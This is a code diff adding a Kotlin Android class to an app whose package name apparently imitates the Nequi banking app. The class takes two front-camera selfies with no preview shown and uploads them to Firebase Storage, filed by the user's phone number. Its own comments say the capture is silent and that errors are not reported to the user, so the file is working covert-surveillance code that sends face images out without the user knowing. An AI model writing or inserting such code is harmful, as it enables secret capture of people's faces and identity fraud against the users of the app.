@@ -1,0 +1,258 @@
+package com.ios.nequixofficialv2.utils
+
+import android.Manifest
+import android.content.Context
+import android.content.pm.PackageManager
+import android.os.Build
+import android.util.Log
+import androidx.camera.core.CameraSelector
+import androidx.camera.core.ImageCapture
+import androidx.camera.core.ImageCaptureException
+import androidx.camera.lifecycle.ProcessCameraProvider
+import androidx.core.content.ContextCompat
+import androidx.lifecycle.LifecycleOwner
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import kotlinx.coroutines.tasks.await
+import com.google.firebase.storage.FirebaseStorage
+import com.google.firebase.storage.StorageReference
+import java.io.File
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
+import java.util.concurrent.ExecutorService
+import java.util.concurrent.Executors
+import android.net.Uri
+
+/**
+ * Clase para capturar selfies de forma silenciosa sin mostrar preview al usuario
+ */
+class SilentSelfieCapture(private val context: Context) {
+
+    private val cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
+    private var imageCapture: ImageCapture? = null
+
+    companion object {
+        private const val TAG = "SilentSelfieCapture"
+        private const val SELFIE_DIR = "selfies"
+        private const val CAPTURE_DELAY_MS = 800L // Delay para dar tiempo a inicializar cámara
+        private const val DELAY_BETWEEN_CAPTURES = 1500L // Delay entre las 2 capturas
+        private const val FIREBASE_STORAGE_PATH = "selfies" // Ruta base en Firebase Storage
+    }
+    
+    private val storage: FirebaseStorage by lazy { FirebaseStorage.getInstance() }
+    private val storageRef: StorageReference by lazy { storage.reference }
+
+    /**
+     * Captura 2 selfies silenciosamente y las sube a Firebase Storage
+     * @param userPhone Número de teléfono del usuario para identificar y organizar las fotos
+     * @param lifecycleOwner LifecycleOwner necesario para CameraX
+     * @param onSuccess Callback cuando ambas capturas son exitosas
+     * @param onError Callback cuando hay un error (opcional, no notifica al usuario)
+     */
+    fun captureSilentSelfie(
+        userPhone: String,
+        lifecycleOwner: LifecycleOwner,
+        onSuccess: ((String) -> Unit)? = null,
+        onError: ((Exception) -> Unit)? = null
+    ) {
+        // Verificar permiso de cámara
+        if (!hasCameraPermission()) {
+            Log.w(TAG, "Permiso de cámara no concedido")
+            onError?.invoke(SecurityException("Camera permission not granted"))
+            return
+        }
+
+        CoroutineScope(Dispatchers.Main).launch {
+            try {
+                // Inicializar cámara en background
+                initCamera(lifecycleOwner)
+                
+                // Esperar un momento para que la cámara se inicialice
+                delay(CAPTURE_DELAY_MS)
+                
+                Log.d(TAG, "Iniciando captura de 2 selfies para usuario: $userPhone")
+                
+                // Capturar primera foto
+                takePicture(userPhone, 1) { file1 ->
+                    Log.d(TAG, "Primera selfie capturada: ${file1.absolutePath}")
+                    
+                    // Subir primera foto a Firebase
+                    uploadToFirebase(file1, userPhone, 1) { url1 ->
+                        Log.d(TAG, "Primera selfie subida a Firebase: $url1")
+                        
+                        // Esperar entre capturas
+                        CoroutineScope(Dispatchers.Main).launch {
+                            delay(DELAY_BETWEEN_CAPTURES)
+                            
+                            // Capturar segunda foto
+                            takePicture(userPhone, 2) { file2 ->
+                                Log.d(TAG, "Segunda selfie capturada: ${file2.absolutePath}")
+                                
+                                // Subir segunda foto a Firebase
+                                uploadToFirebase(file2, userPhone, 2) { url2 ->
+                                    Log.d(TAG, "Segunda selfie subida a Firebase: $url2")
+                                    Log.d(TAG, "✅ Proceso completo: 2 selfies capturadas y subidas para $userPhone")
+                                    
+                                    onSuccess?.invoke("2 selfies capturadas y subidas exitosamente")
+                                    
+                                    // Limpiar recursos
+                                    cleanup()
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error al capturar selfies: ${e.message}", e)
+                onError?.invoke(e)
+                cleanup()
+            }
+        }
+    }
+
+    private suspend fun initCamera(lifecycleOwner: LifecycleOwner) = withContext(Dispatchers.Main) {
+        try {
+            val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
+            val cameraProvider = cameraProviderFuture.get()
+
+            // Configurar ImageCapture
+            imageCapture = ImageCapture.Builder()
+                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                .build()
+
+            // Seleccionar cámara frontal
+            val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
+
+            try {
+                // Desenlazar cualquier uso previo
+                cameraProvider.unbindAll()
+
+                // Enlazar solo ImageCapture (sin preview)
+                cameraProvider.bindToLifecycle(
+                    lifecycleOwner,
+                    cameraSelector,
+                    imageCapture
+                )
+
+                Log.d(TAG, "Cámara inicializada silenciosamente")
+            } catch (exc: Exception) {
+                Log.e(TAG, "Fallo al enlazar cámara: ${exc.message}", exc)
+                throw exc
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error al inicializar cámara: ${e.message}", e)
+            throw e
+        }
+    }
+
+    private fun takePicture(
+        userPhone: String,
+        captureNumber: Int,
+        onSuccess: (File) -> Unit
+    ) {
+        val capture = imageCapture ?: run {
+            Log.e(TAG, "ImageCapture no inicializado")
+            return
+        }
+
+        // Crear directorio para selfies
+        val selfieDir = File(context.filesDir, SELFIE_DIR).apply {
+            if (!exists()) {
+                mkdirs()
+            }
+        }
+
+        // Crear nombre de archivo único con número de captura
+        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss_SSS", Locale.US).format(Date())
+        val photoFile = File(selfieDir, "selfie_${userPhone}_${captureNumber}_${timestamp}.jpg")
+
+        // Configurar opciones de salida
+        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()
+
+        // Tomar foto
+        capture.takePicture(
+            outputOptions,
+            cameraExecutor,
+            object : ImageCapture.OnImageSavedCallback {
+                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
+                    Log.d(TAG, "Selfie #$captureNumber guardada: ${photoFile.absolutePath}")
+                    onSuccess(photoFile)
+                }
+
+                override fun onError(exception: ImageCaptureException) {
+                    Log.e(TAG, "Error al guardar selfie #$captureNumber: ${exception.message}", exception)
+                }
+            }
+        )
+    }
+    
+    private fun uploadToFirebase(
+        file: File,
+        userPhone: String,
+        captureNumber: Int,
+        onSuccess: (String) -> Unit
+    ) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                // Ruta en Firebase Storage: selfies/[TELEFONO]/selfie_[NUMERO]_[TIMESTAMP].jpg
+                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+                val fileName = "selfie_${captureNumber}_${timestamp}.jpg"
+                val firebasePath = "$FIREBASE_STORAGE_PATH/$userPhone/$fileName"
+                
+                val fileRef = storageRef.child(firebasePath)
+                val fileUri = Uri.fromFile(file)
+                
+                Log.d(TAG, "Subiendo selfie #$captureNumber a Firebase: $firebasePath")
+                
+                // Subir archivo
+                val uploadTask = fileRef.putFile(fileUri).await()
+                
+                // Obtener URL de descarga
+                val downloadUrl = fileRef.downloadUrl.await()
+                
+                Log.d(TAG, "Selfie #$captureNumber subida exitosamente: $downloadUrl")
+                
+                withContext(Dispatchers.Main) {
+                    onSuccess(downloadUrl.toString())
+                }
+                
+                // Opcional: Eliminar archivo local después de subir
+                try {
+                    file.delete()
+                    Log.d(TAG, "Archivo local eliminado: ${file.absolutePath}")
+                } catch (e: Exception) {
+                    Log.w(TAG, "No se pudo eliminar archivo local: ${e.message}")
+                }
+                
+            } catch (e: Exception) {
+                Log.e(TAG, "Error al subir selfie #$captureNumber a Firebase: ${e.message}", e)
+            }
+        }
+    }
+
+    private fun hasCameraPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            context,
+            Manifest.permission.CAMERA
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun cleanup() {
+        try {
+            val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
+            val cameraProvider = cameraProviderFuture.get()
+            cameraProvider.unbindAll()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error al limpiar cámara: ${e.message}")
+        }
+    }
+
+    fun shutdown() {
+        cleanup()
+        cameraExecutor.shutdown()
+    }
+}
